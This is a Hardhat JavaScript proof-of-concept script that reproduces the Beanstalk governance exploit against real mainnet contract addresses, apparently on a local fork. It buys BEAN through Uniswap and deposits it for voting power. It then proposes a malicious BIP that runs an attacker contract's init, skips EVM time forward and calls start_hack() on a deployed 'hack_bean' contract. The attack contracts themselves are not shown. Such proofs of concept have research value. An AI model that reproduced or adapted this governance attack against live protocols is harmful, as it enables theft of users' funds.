// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const { ethers } = require("hardhat");
// const { expect } = require("chai");

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  const [signer] = await ethers.getSigners();
  console.log("signer address is: ",signer.address, "the balance of ETH is: ", await signer.getBalance());

  const Exploit_bip = await ethers.getContractFactory("Bip18");
  const bip_test = await Exploit_bip.deploy();
  await bip_test.deployed();
  console.log("bip_test deployed to:", bip_test.address);

  const UNI_V2_router = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";         //swap
  const BEAN = "0xDC59ac4FeFa32293A95889Dc396682858d52e5Db";              //32000000, from Uniswap v2
  const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
  const Beanstalk_protocol = "0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5";        //deposit

  const erc20_abi = ["function balanceOf(address account) external view returns (uint256)", "function approve(address spender, uint256 amount) external returns (bool)"];
  const uniswap_abi = ["function swapExactETHForTokens(uint256 amountOutMin,address[] memory path,address to,uint256 deadline) external payable returns (uint256[] memory amounts)"];
  const beanstalk_abi = [
    "function depositBeans(uint256 amount) external",
    "function propose(tuple(address,uint8,bytes4[])[] calldata cut,address _init,bytes calldata _calldata,uint8 _pauseOrUnpause)",
    "function numberOfBips() external view returns (uint32)",
    "function activeBips() external view returns (uint32[] memory)"];

  const beans = new ethers.Contract(BEAN, erc20_abi, signer);
  const unirouter = new ethers.Contract(UNI_V2_router, uniswap_abi, signer);
  const beanstalk = new ethers.Contract(Beanstalk_protocol, beanstalk_abi, signer);

  await unirouter.swapExactETHForTokens(0, [WETH, BEAN], signer.address, Date.now(), {value : ethers.utils.parseEther('74')});
  console.log("I have got BEAN: ",await beans.balanceOf(signer.address));
  await beans.approve(Beanstalk_protocol, BigInt(99999999999999));
  await beanstalk.depositBeans(await beans.balanceOf(signer.address));
  console.log("deposit done, it's time to propose a bip!");

  // const ex_address = "0xe5ecf73603d98a0128f05ed30506ac7a663dbb69";
  const _bytesdata = bip_test.interface.encodeFunctionData("init");
  await beanstalk.propose([], bip_test.address, _bytesdata, 3);
  const bip_number = await beanstalk.numberOfBips();
  console.log("the bip is proposed...", bip_number, "try to start hacking...");
 
  // We get the contract to deploy after 1 day...
  await ethers.provider.send("evm_increaseTime", [1.5 * 24 * 60 * 60]);

  const poc = await ethers.getContractFactory("hack_bean");
  const poc_test = await poc.deploy();
  await poc_test.deployed();
  console.log("poc_test deployed to:", poc_test.address);
  // console.log("contract balance is:", await ethers.getBalance(poc_test.address));


  // console.log();
  // await poc_test.get_balance_WETH();

  await poc_test.set_all_approve();
  const begin_balance = await signer.getBalance();
  console.log("I have initial money: ", begin_balance);

  await poc_test.start_hack();
  // await poc_test.swap_all_token_to_WETH();
  // await poc_test.get_balance_WETH();
  // await poc_test.withdraw_all_weth();

  // const last_balance = await signer.getBalance();
  // console.log("I have last money: ", last_balance);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
